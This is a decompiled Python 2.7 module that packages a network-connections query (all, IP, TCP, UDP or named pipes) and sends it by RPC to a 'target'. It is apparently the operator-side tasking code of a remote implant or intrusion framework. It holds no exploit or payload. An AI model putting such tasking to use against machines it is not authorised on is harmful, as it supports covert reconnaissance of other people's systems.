# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_NetConnections_Tasking.py
QUERY_TYPE_ALL = 1
QUERY_TYPE_IPONLY = 2
QUERY_TYPE_TCPONLY = 3
QUERY_TYPE_UDPONLY = 4
QUERY_TYPE_PIPESONLY = 5

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.netconnections', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.netconnections.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.network.cmd.netconnections.Params()
    tgtParams.monitor = lpParams['monitor']
    tgtParams.delay = lpParams['delay']
    tgtParams.maximum = lpParams['maximum']
    if lpParams['dataset'] == QUERY_TYPE_ALL:
        tgtParams.queryType = mca.network.cmd.netconnections.PARAMS_QUERY_TYPE_ALL
    elif lpParams['dataset'] == QUERY_TYPE_IPONLY:
        tgtParams.queryType = mca.network.cmd.netconnections.PARAMS_QUERY_TYPE_IP_ONLY
    elif lpParams['dataset'] == QUERY_TYPE_TCPONLY:
        tgtParams.queryType = mca.network.cmd.netconnections.PARAMS_QUERY_TYPE_TCP_ONLY
    elif lpParams['dataset'] == QUERY_TYPE_UDPONLY:
        tgtParams.queryType = mca.network.cmd.netconnections.PARAMS_QUERY_TYPE_UDP_ONLY
    elif lpParams['dataset'] == QUERY_TYPE_PIPESONLY:
        tgtParams.queryType = mca.network.cmd.netconnections.PARAMS_QUERY_TYPE_PIPES_ONLY
    else:
        mcl.tasking.OutputError('Unknown data set requested')
        return False
    rpc = mca.network.cmd.netconnections.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.netconnections.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)